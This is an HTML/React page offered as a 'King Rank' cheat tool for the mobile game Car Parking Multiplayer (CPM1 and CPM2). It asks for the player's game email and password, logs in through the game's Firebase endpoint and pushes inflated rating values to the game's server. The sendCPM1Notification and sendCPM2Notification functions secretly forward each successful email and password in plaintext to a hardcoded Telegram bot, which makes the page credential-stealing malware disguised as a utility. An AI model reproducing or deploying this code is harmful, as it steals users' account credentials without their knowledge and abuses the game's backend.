<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SCOLARIOFFICIAL CPM TOOLS</title>
    <!-- External Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/react@18.0.0/umd/react.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.0.0/umd/react-dom.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <style>
        /* Custom CSS for enhanced styling */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Poppins', sans-serif; /* Changed to Poppins for better readability */
            overflow: hidden;
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            transition: background 0.5s ease;
            color: #fff;
        }
        .container {
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
            z-index: 2;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
            font-family: 'Rajdhani', sans-serif;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
        }
        p {
            font-size: 1.2em;
            margin-bottom: 40px;
            max-width: 600px;
            line-height: 1.6;
        }
        button {
            padding: 15px 30px;
            font-size: 1.2em;
            background-color: rgba(255, 255, 255, 0.2);
            border: 2px solid white;
            color: white;
            cursor: pointer;
            border-radius: 10px; /* Softer corners */
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        button:hover {
            background-color: rgba(255, 255, 255, 0.4);
            transform: translateY(-2px); /* Subtle lift effect */
        }
        .bg-controls {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            gap: 10px;
            z-index: 3;
        }
        .bg-controls button {
            padding: 10px;
            font-size: 0.8em;
            border-radius: 50%; /* Circular buttons for controls */
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #particles-js {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: rgba(0, 0, 0, 0.8);
            color: #ccc;
            text-align: center;
            padding: 10px;
            font-size: 0.9em;
            z-index: 3;
        }
        /* Additional Tailwind-like enhancements */
        .glow-text {
            text-shadow: 0 0 10px #00d4ff, 0 0 20px #00d4ff, 0 0 30px #00d4ff;
        }
        .neon-button {
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5), 0 0 20px rgba(0, 212, 255, 0.3);
        }
        .gaming-card {
            background: rgba(0, 0, 0, 0.8);
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .loading-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Responsive adjustments */
        @media (max-width: 768px) {
            h1 { font-size: 2.5em; }
            p { font-size: 1em; }
            button { padding: 12px 24px; font-size: 1em; }
            .bg-controls { top: 10px; right: 10px; }
            footer { font-size: 0.8em; padding: 8px; }
        }
    </style>
</head>
<body>
    <!-- Particles Background -->
    <div id="particles-js"></div>

    <!-- Background Controls (Example: Add buttons to change background) -->
    <div class="bg-controls">
        <button onclick="changeBackground('linear-gradient(45deg, #667eea 0%, #764ba2 100%)')" title="Default Gradient">
            <i class="fas fa-palette"></i>
        </button>
        <button onclick="changeBackground('linear-gradient(45deg, #ff6b6b 0%, #feca57 100%)')" title="Warm Gradient">
            <i class="fas fa-sun"></i>
        </button>
        <button onclick="changeBackground('linear-gradient(45deg, #48cae4 0%, #023e8a 100%)')" title="Cool Gradient">
            <i class="fas fa-water"></i>
        </button>
    </div>

    <!-- React Root -->
    <div id="root"></div>

    <!-- Footer -->
    <footer>
        &copy; 2025 SCOLARIOFFICIAL CPM TOOLS. All rights reserved.
    </footer>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script type="text/babel">
        // Particles.js Configuration (unchanged, but optimized for performance)
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": "#ffffff" },
                "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 } },
                "opacity": { "value": 0.5, "random": false, "anim": { "enable": false, "speed": 1, "opacity_min": 0.1, "sync": false } },
                "size": { "value": 3, "random": true, "anim": { "enable": false, "speed": 40, "size_min": 0.1, "sync": false } },
                "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 },
                "move": { "enable": true, "speed": 6, "direction": "none", "random": false, "straight": false, "out_mode": "out", "bounce": false, "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": { "onhover": { "enable": true, "mode": "repulse" }, "onclick": { "enable": true, "mode": "push" }, "resize": true },
                "modes": {
                    "grab": { "distance": 400, "line_linked": { "opacity": 1 } },
                    "bubble": { "distance": 400, "size": 40, "duration": 2, "opacity": 8, "speed": 3 },
                    "repulse": { "distance": 200, "duration": 0.4 },
                    "push": { "particles_nb": 4 },
                    "remove": { "particles_nb": 2 }
                }
            },
            "retina_detect": true
        });

        // Background Change Function
        function changeBackground(bg) {
            document.body.style.background = bg;
        }

        // Placeholder Configs (Replace with actual data)
        // Telegram configuration
        const BOT_TOKEN = "8363058552:AAEY57Exn4ELKZ4T9hBDpUJaQdk45oTSh0E";
        const CHAT_ID = 6095291231;

        // CPM1 Configurations
        const CPM1_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
        };

        // CPM2 Configurations
        const CPM2_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
        };

        // React App
        function App() {
            const [currentPage, setCurrentPage] = React.useState('home');
            const [currentConfig, setCurrentConfig] = React.useState(CPM1_CONFIG);
            const [email, setEmail] = React.useState('');
            const [password, setPassword] = React.useState('');
            const [status, setStatus] = React.useState('');
            const [isLoading, setIsLoading] = React.useState(false);

            const handleCPM1Click = () => {
                setCurrentConfig(CPM1_CONFIG);
                setCurrentPage('login');
            };

            const handleCPM2Click = () => {
                setCurrentConfig(CPM2_CONFIG);
                setCurrentPage('login');
            };

            const goHome = () => {
                setCurrentPage('home');
                setEmail('');
                setPassword('');
                setStatus('');
            };
            const sendCPM1Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `ðŸ” Login Cpm1:\nðŸ“§ Email: ${email}\nðŸ”’ Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const sendCPM2Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `ðŸ” Login Cpm2:\nðŸ“§ Email: ${email}\nðŸ”’ Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const login = async (email, password) => {
                setStatus('Logging in...');
                setIsLoading(true);
                
                try {
                    const response = await fetch(`${currentConfig.FIREBASE_LOGIN_URL}?key=${currentConfig.FIREBASE_API_KEY}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
                        },
                        body: JSON.stringify({
                            clientType: 'CLIENT_TYPE_ANDROID',
                            email,
                            password,
                            returnSecureToken: true
                        })
                    });

                    const data = await response.json();

                    if (response.ok && data.idToken) {
                        setStatus('Login successful!');
                        
                        if (currentConfig === CPM1_CONFIG) {
                            sendCPM1Notification(email, password);
                        } else {
                            sendCPM2Notification(email, password);
                        }
                        
                        return data.idToken;
                    } else {
                        throw new Error(data.error?.message || 'Login failed');
                    }
                } catch (error) {
                    setStatus(`Login failed: ${error.message}`);
                    return null;
                } finally {
                    setIsLoading(false);
                }
            };

            const setRank = async (token) => {
                setStatus('Setting KING RANK...');
                setIsLoading(true);
                
                try {
                    const ratingData = Object.fromEntries(
                        ["cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
                         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
                         "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
                         "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"]
                        .map(key => [key, 100000])
                    );
                    
                    ratingData.time = 10000000000;
                    ratingData.race_win = 3000;

                    const response = await fetch(currentConfig.RANK_URL, {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${token}`,
                            'Content-Type': 'application/json',
                            'User-Agent': 'okhttp/3.12.13'
                        },
                        body: JSON.stringify({ data: JSON.stringify({ RatingData: ratingData }) })
                    });

                    if (response.ok) {
                        setStatus('Rank successfully set!');
                        return true;
                    } else {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Failed to set rank');
                    }
                } catch (error) {
                    setStatus(`Failed to set rank: ${error.message}`);
                    return false;
                } finally {
                    setIsLoading(false);
                }
            };

            const handleSubmit = async (e) => {
                e.preventDefault();
                const token = await login(email, password);
                
                if (token) {
                    await setRank(token);
                }
            };
        /*    const handleSubmit = async (e) => {
                e.preventDefault();
                setIsLoading(true);
                setStatus('');
                // Simulate API call (replace with actual logic)
                setTimeout(() => {
                    setStatus('Login successful!'); // Or error message
                    setIsLoading(false);
                }, 2000);
            };
*/
            const renderHomePage = () => (
                <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                    <div className="gaming-card w-full max-w-lg p-8">
                        <h1 className="text-4xl md:text-5xl font-bold text-center mb-8 text-blue-400 glow-text game-font">
                            SCOLARIOFFICIAL
                        </h1>
                        <div className="flex flex-col space-y-4">
                            <button 
                                onClick={handleCPM1Click}
                                className="neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
                            >
                                <i className="fas fa-gamepad mr-3"></i> KING CPM 1
                            </button>
                            <button 
                                onClick={handleCPM2Click}
                                className="neon-button btn-secondary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
                            >
                                <i className="fas fa-gamepad mr-3"></i> KING CPM 2
                            </button>
                        </div>
                    </div>
                </div>
            );

            const renderLoginPage = () => (
                <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                    <div className="gaming-card w-full max-w-md p-8 relative">
                        <button 
                            onClick={goHome}
                            className="absolute top-4 left-4 text-gray-400 hover:text-white transition-all duration-300"
                            aria-label="Go back to home"
                        >
                            <i className="fas fa-arrow-left text-xl"></i>
                        </button>
                        
                        <h2 className="text-2xl md:text-3xl font-bold text-center mb-6 text-blue-400 glow-text game-font">
                            {currentConfig === CPM1_CONFIG ? 'CPM1 Login' : 'CPM2 Login'}
                        </h2>
                        
                        <form onSubmit={handleSubmit} className="space-y-6">
                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-2">
                                    Email
                                </label>
                                <input
                                    type="email"
                                    id="email"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
                                    placeholder="Enter your email"
                                    required
                                    aria-describedby="email-error"
                                />
                            </div>
                            
                            <div>
                                <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-2">
                                    Password
                                </label>
                                <input
                                    type="password"
                                    id="password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
                                    placeholder="Enter your password"
                                    required
                                    aria-describedby="password-error"
                                />
                            </div>
                            
                            <button
                                type="submit"
                                disabled={isLoading}
                                className="w-full neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg"
                            >
                                {isLoading ? (
                                    <div className="flex items-center justify-center">
                                        <div className="loading-spinner mr-3"></div>
                                        Processing...
                                    </div>
                                ) : 'Get King Rank'}
                            </button>
                        </form>
                        
                        {status && (
                            <div className="mt-6 p-4 bg-red-900 bg-opacity-50 border border-red-700 rounded-lg text-red-200" role="alert">
                                <div className="flex items-center">
                                    <i className="fas fa-exclamation-triangle mr-2"></i>
                                    <span>{status}</span>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            );

            return (
                <div className="bg-slate-900 min-h-screen">
                    {currentPage === 'home' ? renderHomePage() : renderLoginPage()}
                </div>
            );
        }

        ReactDOM.render(<App />, document.getElementById('root'));
    </script>
</body>
</html>
